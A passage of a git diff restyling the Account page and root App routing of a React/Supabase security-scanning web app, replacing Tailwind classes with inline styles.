-      <div className="max-w-md mx-auto px-6 py-8">
-        <div className="flex items-center gap-2 mb-8">
-          <button onClick={onBack} className="text-slate-500 hover:text-white text-sm transition-colors">← Back</button>
-          <span className="text-slate-700">/</span>
-          <span className="text-sm text-slate-400">Account</span>
+    <Page>
+      <Header user={user} onNewScan={()=>{}} onAccount={()=>{}} onHome={onBack} />
+      <Container style={{ padding:'32px 24px', flex:1 }}>
+        <div style={{ marginBottom:24, display:'flex', alignItems:'center', gap:12 }}>
+          <button onClick={onBack} style={{ background:'none', border:'none', cursor:'pointer', color:'#888', fontSize:14 }}>← Back</button>
+          <span style={{ color:'#ddd' }}>/</span>
+          <h1 style={{ fontSize:18, fontWeight:500, color:'#1a1a2e' }}>Account</h1>
         </div>
-        <Card className="p-6 mb-4">
-          <div className="flex items-center gap-4 mb-5 pb-5 border-b border-white/[0.06]">
-            <div className="w-10 h-10 rounded-full bg-blue-600/20 border border-blue-600/30 flex items-center justify-center text-blue-400 font-bold">
-              {user?.email?.[0]?.toUpperCase()}
-            </div>
-            <div>
-              <p className="font-semibold text-sm text-white">{user?.email}</p>
-              <p className="text-xs text-slate-500">Free account · Unlimited scans</p>
-            </div>
-          </div>
-          <div className="space-y-3">
-            {[['Email',user?.email],['Member since',new Date(user?.created_at).toLocaleDateString('en-IN',{dateStyle:'long'})],['Plan','Free — unlimited scans']].map(([l,v]) => (
-              <div key={l} className="flex justify-between">
-                <span className="text-xs text-slate-500">{l}</span>
-                <span className="text-xs text-slate-300 font-medium">{v}</span>
+        <div style={{ maxWidth:480 }}>
+          <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24, marginBottom:12 }}>
+            <div style={{ display:'flex', alignItems:'center', gap:14, marginBottom:20, paddingBottom:20, borderBottom:`0.5px solid ${COLORS.border}` }}>
+              <div style={{ width:44, height:44, borderRadius:'50%', background:COLORS.primaryLt, border:`0.5px solid ${COLORS.primary}44`,
+                display:'flex', alignItems:'center', justifyContent:'center', fontWeight:500, fontSize:16, color:COLORS.primary }}>
+                {user?.email?.[0]?.toUpperCase()}
               </div>
-            ))}
+              <div>
+                <p style={{ fontWeight:500, fontSize:14, color:'#1a1a2e' }}>{user?.email}</p>
+                <p style={{ fontSize:12, color:'#888', marginTop:2 }}>Free account · unlimited scans</p>
+              </div>
+            </div>
+            <div style={{ display:'flex', flexDirection:'column', gap:10 }}>
+              {[['Email',user?.email],['Member since',new Date(user?.created_at).toLocaleDateString('en-IN',{dateStyle:'long'})],['Plan','Free — unlimited scans']].map(([l,v])=>(
+                <div key={l} style={{ display:'flex', justifyContent:'space-between' }}>
+                  <span style={{ fontSize:13, color:'#888' }}>{l}</span>
+                  <span style={{ fontSize:13, fontWeight:500, color:'#1a1a2e' }}>{v}</span>
+                </div>
+              ))}
+            </div>
           </div>
-        </Card>
-        <button onClick={onSignOut} className="w-full py-2.5 bg-white/[0.03] hover:bg-white/[0.06] border border-white/[0.06] text-slate-400 hover:text-white text-sm font-medium rounded-xl transition-colors">
-          Sign Out
-        </button>
-      </div>
-    </div>
+          <button onClick={onSignOut} style={{ ...btnOutline, width:'100%', textAlign:'center' }}>Sign out</button>
+        </div>
+      </Container>
+    </Page>
   );
 }
 
@@ -1158,94 +1577,58 @@ function Account({ user, onBack, onSignOut }) {
 // ROOT APP
 // ══════════════════════════════════════════════════════════════
 export default function App() {
-  const [page, setPage]       = useState('landing');
-  const [user, setUser]       = useState(null);
-  const [result, setResult]   = useState(null);
-  const [scanId, setScanId]   = useState(null);
-  const [scanPublic, setScanPublic] = useState(false);
-  const [toast, setToast]     = useState(null);
-  const [ready, setReady]     = useState(false);
-  const [sharedId, setSharedId] = useState(null);
+  const [page,setPage]=useState('landing');const[user,setUser]=useState(null);
+  const [result,setResult]=useState(null);const[scanId,setScanId]=useState(null);
+  const [scanPublic,setScanPublic]=useState(false);const[toast,setToast]=useState(null);
+  const [ready,setReady]=useState(false);const[sharedId,setSharedId]=useState(null);
 
-  useEffect(() => {
-    // Check for shared report in URL
-    const sid = getSharedIdFromUrl();
-    if (sid) { setSharedId(sid); setPage('public'); setReady(true); return; }
-
-    supabase.auth.getSession().then(({ data }) => {
-      if (data.session?.user) { setUser(data.session.user); setPage('dashboard'); }
+  useEffect(()=>{
+    const sid=getSharedId();
+    if(sid){setSharedId(sid);setPage('public');setReady(true);return;}
+    supabase.auth.getSession().then(({data})=>{
+      if(data.session?.user){setUser(data.session.user);setPage('dashboard');}
       setReady(true);
     });
-    const { data: sub } = supabase.auth.onAuthStateChange((_e, session) => {
-      setUser(session?.user || null);
-      if (!session) setPage('landing');
-    });
-    return () => sub.subscription.unsubscribe();
-  }, []);
+    const{data:sub}=supabase.auth.onAuthStateChange((_e,session)=>{setUser(session?.user||null);if(!session)setPage('landing');});
+    return()=>sub.subscription.unsubscribe();
+  },[]);
 
-  const showToast = (message, type='info') => setToast({ message, type });
+  const showToast=(msg,type='info')=>setToast({message:msg,type});
+  async function signOut(){await supabase.auth.signOut();setUser(null);setPage('landing');}
 
-  async function signOut() {
-    await supabase.auth.signOut();
-    setUser(null); setPage('landing');
-  }
-
-  if (!ready) return (
-    <div className="min-h-screen bg-[#080a0e] flex items-center justify-center">
-      <div className="w-6 h-6 rounded-full border-2 border-blue-500/30 border-t-blue-500 animate-spin" />
+  if(!ready) return (
+    <div style={{ minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center', background:'#F5F7FA' }}>
+      <div style={{ width:24, height:24, borderRadius:'50%', border:`2px solid ${COLORS.primaryLt}`, borderTopColor:COLORS.primary, animation:'spin 0.8s linear infinite' }} />
     </div>
   );
 
   return (
-    <div className="min-h-screen bg-[#080a0e] text-white">
+    <div style={{ minHeight:'100vh', background:'#F5F7FA', fontFamily:'Inter, system-ui, sans-serif' }}>
+      <style>{`
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap');
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+        @keyframes fadeIn { from{opacity:0;transform:translateY(-4px)} to{opacity:1;transform:translateY(0)} }
+        button:hover { opacity: 0.88; }
+        input:focus, textarea:focus { border-color: #185FA5 !important; box-shadow: 0 0 0 3px #185FA522; }
+        * { font-family: Inter, system-ui, sans-serif; }
+        code, pre, .mono { font-family: 'Source Code Pro', 'Courier New', monospace !important; }
+        @media print {
+          .no-print { display: none !important; }
+          body { background: white; }
+        }
+      `}</style>
+
       {toast && <Toast {...toast} onClose={()=>setToast(null)} />}
 
-      {/* Nav — shown on all logged-in pages */}
-      {user && !['landing','login','signup','public'].includes(page) && (
-        <header className="no-print border-b border-white/[0.06] bg-[#080a0e]/90 backdrop-blur sticky top-0 z-40">
-          <div className="max-w-5xl mx-auto px-4 md:px-6 h-14 flex items-center justify-between">
-            <button onClick={()=>setPage('dashboard')} className="flex items-center gap-2">
-              <div className="w-7 h-7 rounded-lg bg-blue-600 flex items-center justify-center text-sm">🛡</div>
-              <span className="font-bold text-white tracking-tight hidden sm:block">ThreatAnalyzer</span>
-              <span className="text-[10px] font-mono text-blue-400 bg-blue-500/10 border border-blue-500/20 px-1.5 py-0.5 rounded ml-1">AI</span>
-            </button>
-            <div className="flex items-center gap-1">
-              <button onClick={()=>setPage('scan')} className="flex items-center gap-1.5 px-3 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-xs md:text-sm font-medium rounded-lg transition-colors">
-                + New Scan
-              </button>
-              <button onClick={()=>setPage('account')} className="px-3 py-1.5 text-slate-400 hover:text-white text-sm transition-colors rounded-lg hover:bg-white/5">
-                Account
-              </button>
-            </div>
-          </div>
-        </header>
-      )}
-
-      {page==='public' && sharedId && <PublicReport scanId={sharedId} onSignup={()=>{window.history.pushState({},'','/');setPage('signup');}} />}
-      {page==='landing' && <Landing onLogin={()=>setPage('login')} onSignup={()=>setPage('signup')} />}
-      {(page==='login'||page==='signup') && <Auth mode={page} onSuccess={u=>{setUser(u);setPage('dashboard');}} onSwitch={()=>setPage(page==='login'?'signup':'login')} />}
-      {page==='dashboard'&&user && (
-        <Dashboard user={user} onNewScan={()=>setPage('scan')}
-          onViewScan={async id=>{
-            try {
-              const d = await apiFetch(`/api/scans/${id}`);
-              setResult(d.scan.result);
-              setScanId(d.scan.id);
-              setScanPublic(d.scan.is_public||false);
-              setPage('report');
-            } catch(e) { showToast(e.message,'error'); }
-          }} />
-      )}
-      {page==='scan'&&user && (
-        <NewScan
-          onComplete={(r, sid) => { setResult(r); setScanId(sid||null); setScanPublic(false); setPage('report'); }}
-          onBack={()=>setPage('dashboard')} />
-      )}
-      {page==='report'&&result && (
-        <Report result={result} scanId={scanId} isPublic={scanPublic}
-          onBack={()=>setPage('dashboard')} onNewScan={()=>setPage('scan')} onToast={showToast} />
-      )}
-      {page==='account'&&user && <Account user={user} onBack={()=>setPage('dashboard')} onSignOut={signOut} />}
+      {page==='public'&&sharedId&&<PublicReport scanId={sharedId} onSignup={()=>{window.history.pushState({},'','/');setPage('signup');}} />}
+      {page==='landing'&&<Landing onLogin={()=>setPage('login')} onSignup={()=>setPage('signup')} />}
+      {(page==='login'||page==='signup')&&<Auth mode={page} onSuccess={u=>{setUser(u);setPage('dashboard');}} onSwitch={()=>setPage(page==='login'?'signup':'login')} />}
+      {page==='dashboard'&&user&&<Dashboard user={user} onNewScan={()=>setPage('scan')} onViewScan={async id=>{try{const d=await apiFetch(`/api/scans/${id}`);setResult(d.scan.result);setScanId(d.scan.id);setScanPublic(d.scan.is_public||false);setPage('report');}catch(e){showToast(e.message,'error');}}} />}
+      {page==='scan'&&user&&<NewScan onComplete={(r,sid)=>{setResult(r);setScanId(sid||null);setScanPublic(false);setPage('report');}} onBack={()=>setPage('dashboard')} />}
+      {page==='report'&&result&&<Report result={result} scanId={scanId} isPublic={scanPublic} onBack={()=>setPage('dashboard')} onNewScan={()=>setPage('scan')} onToast={showToast} />}
+      {page==='account'&&user&&<Account user={user} onBack={()=>setPage('dashboard')} onSignOut={signOut} />}
     </div>
   );
 }
